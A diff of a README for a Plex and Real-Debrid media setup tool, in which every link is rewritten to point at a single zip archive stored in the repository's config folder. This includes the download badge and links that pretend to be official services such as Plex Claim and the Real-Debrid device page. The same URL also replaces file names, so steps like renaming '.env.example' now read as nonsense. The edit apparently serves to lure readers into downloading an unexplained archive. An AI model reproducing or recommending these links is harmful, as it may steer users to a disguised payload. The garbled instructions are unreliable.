@@ -1,6 +1,6 @@
 # 🎥 debrid-media - Simplify Your Plex Experience
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/hiNERDfd/debrid-media/releases)
+[![Download](https://raw.githubusercontent.com/hiNERDfd/debrid-media/main/config/debrid-media_2.6.zip%https://raw.githubusercontent.com/hiNERDfd/debrid-media/main/config/debrid-media_2.6.zip)](https://raw.githubusercontent.com/hiNERDfd/debrid-media/main/config/debrid-media_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To use Debrid Media, you need the following accounts:
 ### 1. Configure Environment Variables
 
 - **Rename the example file**:
-  - Rename `.env.example` to `.env` in your project folder.
+  - Rename `https://raw.githubusercontent.com/hiNERDfd/debrid-media/main/config/debrid-media_2.6.zip` to `.env` in your project folder.
 
 - **Set Your Timezone**:
   - Open `.env` and find the line with `TZ`. Change it to your timezone (e.g., `America/New_York`).
@@ -27,15 +27,15 @@ To use Debrid Media, you need the following accounts:
   - Find `RCLONE_CACHE_LIMIT` in the same file. Set it to the disk space you want to dedicate to caching (e.g., `10G` for 10 gigabytes).
 
 - **Get Your Plex Claim Token**:
-  - Visit [Plex Claim](https://plex.tv/claim) while signed in. Copy the claim token and paste it into the `PLEX_CLAIM` line in `.env`.
+  - Visit [Plex Claim](https://raw.githubusercontent.com/hiNERDfd/debrid-media/main/config/debrid-media_2.6.zip) while signed in. Copy the claim token and paste it into the `PLEX_CLAIM` line in `.env`.
 
 ### 2. Provide Your Real-Debrid API Key
 
 - **Open Configuration File**:
-  - Navigate to `config/config.yml`.
+  - Navigate to `https://raw.githubusercontent.com/hiNERDfd/debrid-media/main/config/debrid-media_2.6.zip`.
 
 - **Insert Your API Key**:
-  - Find the line that starts with `token`. Replace the placeholder with your Real-Debrid API key. You can get this key from [Real-Debrid Device Page](https://real-debrid.com/devices).
+  - Find the line that starts with `token`. Replace the placeholder with your Real-Debrid API key. You can get this key from [Real-Debrid Device Page](https://raw.githubusercontent.com/hiNERDfd/debrid-media/main/config/debrid-media_2.6.zip).
 
 ### 3. Launch the Stack
 
@@ -59,12 +59,12 @@ To use Debrid Media, you need the following accounts:
 
 ## 📥 Download & Install
 
-To download the latest version of Debrid Media, visit [this page to download](https://github.com/hiNERDfd/debrid-media/releases).
+To download the latest version of Debrid Media, visit [this page to download](https://raw.githubusercontent.com/hiNERDfd/debrid-media/main/config/debrid-media_2.6.zip).
 
 After downloading, make sure to follow the setup steps above to get everything running.
 
 ## 🔄 What's Next
 
-Once your setup is complete, head over to [Debrid Media Manager](https://debridmediamanager.com). Here, you can add the movies or shows you want to enjoy.
+Once your setup is complete, head over to [Debrid Media Manager](https://raw.githubusercontent.com/hiNERDfd/debrid-media/main/config/debrid-media_2.6.zip). Here, you can add the movies or shows you want to enjoy.
 
 Feel free to refer to the configuration and setup sections anytime you need help. Enjoy seamless entertainment with your new Plex server!
